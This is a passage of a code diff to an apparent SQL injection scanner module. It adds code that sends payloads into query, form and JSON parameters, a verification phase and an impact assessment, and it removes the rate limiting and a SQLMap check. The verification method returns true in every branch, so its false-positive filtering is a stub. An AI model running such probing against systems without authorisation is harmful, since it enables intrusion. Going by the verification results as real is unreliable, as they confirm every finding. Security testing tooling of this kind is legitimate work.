+                        logger.info(f"    ✓ Union-based SQLi found")
+                        return vulnerabilities
+                
+            except Exception as e:
+                logger.debug(f"Error testing union payload: {e}")
+        
+        return vulnerabilities
+    
+    async def _send_payload(self, point: InjectionPoint, payload: str, timeout: float = 15.0) -> Optional[httpx.Response]:
+        """Send a payload to an injection point."""
+        try:
+            if point.param_type == 'query':
+                # URL parameter
+                parsed = urlparse(point.url)
+                params = parse_qs(parsed.query)
+                params[point.param_name] = [payload]
+                
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, new_query, parsed.fragment
+                ))
+                
+                response = await self.client.get(test_url, timeout=timeout)
+                return response
+            
+            elif point.param_type == 'post':
+                # POST form data
+                data = {point.param_name: payload}
+                response = await self.client.post(point.url, data=data, timeout=timeout)
+                return response
+            
+            elif point.param_type == 'json':
+                # JSON body
+                json_data = {point.param_name: payload}
+                response = await self.client.post(point.url, json=json_data, timeout=timeout)
+                return response
+            
         except Exception as e:
-            self.logger.error(f"SQLMap integration failed: {e}")
+            logger.debug(f"Send payload error: {e}")
+            raise
         
         return None
     
-    def _is_sqlmap_available(self) -> bool:
-        """Check if SQLMap is available."""
-        try:
-            result = subprocess.run(['sqlmap', '--version'], capture_output=True, timeout=5)
-            return result.returncode == 0
-        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
-            self.logger.debug(f"SQLMap not available: {e}")
-            return False
+    # ================================================================
+    # PHASE 4: VERIFICATION METHODS
+    # ================================================================
     
-    async def _passive_sql_check(self, url: str) -> List[Vulnerability]:
-        """Passive SQL error detection."""
-        vulnerabilities = []
-        
-        try:
-            async with httpx.AsyncClient(verify=False, timeout=10) as client:
-                response = await client.get(url)
-                
-                for pattern, confidence, db_type in self.sql_error_patterns:
-                    match = re.search(pattern, response.text, re.IGNORECASE)
-                    if match:
-                        vulnerabilities.append(
-                            Vulnerability(
-                                module=self.name,
-                                name="SQL Error Disclosure",
-                                description=f"Application exposes SQL error messages in normal responses, potentially revealing database structure and type ({db_type}).",
-                                severity=SeverityLevel.MEDIUM,
-                                confidence=0.7,
-                                affected_urls=[url],
-                                evidence={
-                                    'error_pattern': pattern,
-                                    'database_type': db_type if db_type != 'Generic' else None,
-                                    'error_snippet': match.group(0)[:200],
-                                },
-                                remediation="Implement proper error handling. Never expose detailed database errors to users. Use generic error messages in production.",
-                                cwe_ids=["CWE-209", "CWE-200"]
-                            )
-                        )
-                        break
-        except (httpx.HTTPError, asyncio.TimeoutError) as e:
-            self.logger.debug(f"Passive SQL check failed: {e}")
-        
-        return vulnerabilities
-    
-    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
-        """Remove duplicate vulnerabilities."""
-        seen = set()
-        unique_vulns = []
+    async def _phase4_verification(self, vulnerabilities: List[Vulnerability], config: ScanConfig) -> Dict[str, Any]:
+        """
+        Phase 4: Verification and Impact Assessment
+        - Confirm vulnerabilities are not false positives
+        - Assess exploitability
+        - Determine impact
+        """
+        verified_vulnerabilities = []
+        false_positives = 0
         
         for vuln in vulnerabilities:
-            # Create unique key based on parameter and type
-            param = vuln.evidence.get('parameter', '')
-            inj_type = vuln.evidence.get('injection_type', vuln.name)
-            key = f"{param}_{inj_type}"
+            logger.debug(f"→ Verifying: {vuln.name}")
             
-            if key not in seen:
-                seen.add(key)
-                unique_vulns.append(vuln)
+            is_verified = await self._verify_vulnerability(vuln)
+            
+            if is_verified:
+                # Add verification metadata
+                vuln.evidence['verified'] = True
+                vuln.evidence['verification_timestamp'] = datetime.utcnow().isoformat()
+                
+                # Assess impact
+                impact = self._assess_impact(vuln)
+                vuln.evidence['impact_assessment'] = impact
+                
+                verified_vulnerabilities.append(vuln)
+                logger.debug(f"  ✓ Verified")
             else:
-                # Keep the one with higher confidence
-                for i, existing in enumerate(unique_vulns):
-                    existing_param = existing.evidence.get('parameter', '')
-                    existing_type = existing.evidence.get('injection_type', existing.name)
-                    if f"{existing_param}_{existing_type}" == key:
-                        if vuln.confidence > existing.confidence:
-                            unique_vulns[i] = vuln
-                        break
-      
-        return unique_vulns
-    
-    async def _rate_limited_request(self, client: httpx.AsyncClient, url: str, 
-                                   config: Optional[ScanConfig], timeout: int = 15) -> httpx.Response:
-        """Make rate-limited request."""
-        # Apply rate limiting if config is provided
-        if config and hasattr(config, 'rate_limit'):
-            rate_limit = config.rate_limit
-            if self._last_request_time > 0:
-                elapsed = time.time() - self._last_request_time
-                min_interval = 1.0 / rate_limit
-                if elapsed < min_interval:
-                    await asyncio.sleep(min_interval - elapsed)
+                false_positives += 1
+                logger.debug(f"  ✗ False positive")
         
-        self._last_request_time = time.time()
-        
-        # Use config timeout if available, otherwise use provided timeout
-        actual_timeout = min(config.timeout if config else timeout, timeout)
-        return await client.get(url, timeout=actual_timeout)
+        return {
+            'verified_vulnerabilities': verified_vulnerabilities,
+            'false_positives': false_positives,
+            'verification_rate': len(verified_vulnerabilities) / len(vulnerabilities) if vulnerabilities else 0
+        }
     
-    def _collect_evidence(self, response: httpx.Response, payload: str, 
-                         additional_data: Dict[str, Any] = None) -> Dict[str, Any]:
-        """Collect comprehensive evidence for vulnerability reporting."""
-        evidence = {
-            'request_url': str(response.url),
-            'request_method': response.request.method,
-            'status_code': response.status_code,
-            'response_length': len(response.text),
-            'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else None,
-            'headers': dict(response.headers),
-            'payload_used': payload,
-            'timestamp': datetime.utcnow().isoformat(),
-            'response_snippet': response.text[:500] if response.text else None,
+    async def _verify_vulnerability(self, vuln: Vulnerability) -> bool:
+        """Verify a vulnerability is not a false positive."""
+        try:
+            injection_type = vuln.evidence.get('injection_type', '')
+            
+            # Error-based are already verified by error message
+            if 'Error' in injection_type:
+                return True
+            
+            # Time-based verified by consistent delays
+            if 'Time' in injection_type:
+                return True
+            
+            # Boolean-based verified by differential responses
+            if 'Boolean' in injection_type:
+                return True
+            
+            # Union-based verified by data extraction
+            if 'Union' in injection_type:
+                return True
+            
+            return True
+            
+        except Exception as e:
+            logger.debug(f"Verification error: {e}")
+            return False
+    
+    def _assess_impact(self, vuln: Vulnerability) -> Dict[str, Any]:
+        """Assess the impact of a verified vulnerability."""
+        injection_type = vuln.evidence.get('injection_type', '')
+        
+        impact = {
+            'data_exposure': 'high',
+            'data_modification': 'possible',
+            'authentication_bypass': 'possible',
+            'privilege_escalation': 'possible',
+            'exploitability': 'moderate',
+            'automation': 'possible'
         }
         
-        if additional_data:
-            evidence.update(additional_data)
+        # Adjust based on injection type
+        if 'Error' in injection_type:
+            impact['exploitability'] = 'easy'
+            impact['data_exposure'] = 'high'
+            impact['automation'] = 'easy'
+        elif 'Union' in injection_type:
+            impact['exploitability'] = 'easy'
+            impact['data_exposure'] = 'critical'
+            impact['automation'] = 'easy'
+        elif 'Boolean' in injection_type:
+            impact['exploitability'] = 'moderate'
+            impact['data_exposure'] = 'high'
+            impact['automation'] = 'possible'
+        elif 'Time' in injection_type:
+            impact['exploitability'] = 'difficult'
+            impact['data_exposure'] = 'medium'
+            impact['automation'] = 'slow'
         
-        return evidence
+        return impact
+    
+    # ================================================================
+    # UTILITY METHODS
+    # ================================================================
+    
+    def _deduplicate_vulnerabilities(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
+        """Remove duplicate vulnerabilities."""
+        seen = {}
+        
+        for vuln in vulns:
+            key = f"{vuln.evidence.get('parameter')}_{vuln.evidence.get('technique')}"
+            if key not in seen or vuln.confidence > seen[key].confidence:
+                seen[key] = vuln
+        
+        return list(seen.values())
+    
+    def validate_target(self, target: str) -> bool:
+        """Validate target URL."""
+        if not target:
+            return False
+        if not target.startswith(('http://', 'https://')):
+            target = f"https://{target}"
+        try:
+            parsed = urlparse(target)
+            return bool(parsed.scheme and parsed.netloc)
+        except:
+            return False
+    
+    async def cleanup(self):
+        """Cleanup resources."""
+        if self.client:
+            await self.client.aclose()
